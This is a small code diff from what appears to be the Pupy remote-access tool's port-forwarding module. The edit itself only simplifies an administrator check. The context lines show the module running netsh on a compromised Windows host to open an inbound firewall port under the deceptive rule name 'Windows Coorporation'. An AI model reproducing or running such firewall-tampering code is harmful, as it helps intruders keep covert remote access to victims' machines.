@@ -194,7 +194,7 @@ class PortFwdModule(PupyModule):
 
             if "Windows" in self.client.desc["platform"]:
                 self.client.load_package("pupwinutils.processes")
-                if self.client.conn.modules['pupwinutils.processes'].isUserAdmin() == True:
+                if self.client.conn.modules['pupwinutils.processes'].isUserAdmin():
                     # create new firewall rule
                     cmd = 'netsh advfirewall firewall add rule name="Windows Coorporation" dir=in action=allow protocol=TCP localport=%s' % str(remote_port)
                     output = self.client.conn.modules.subprocess.check_output(cmd.split(), stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
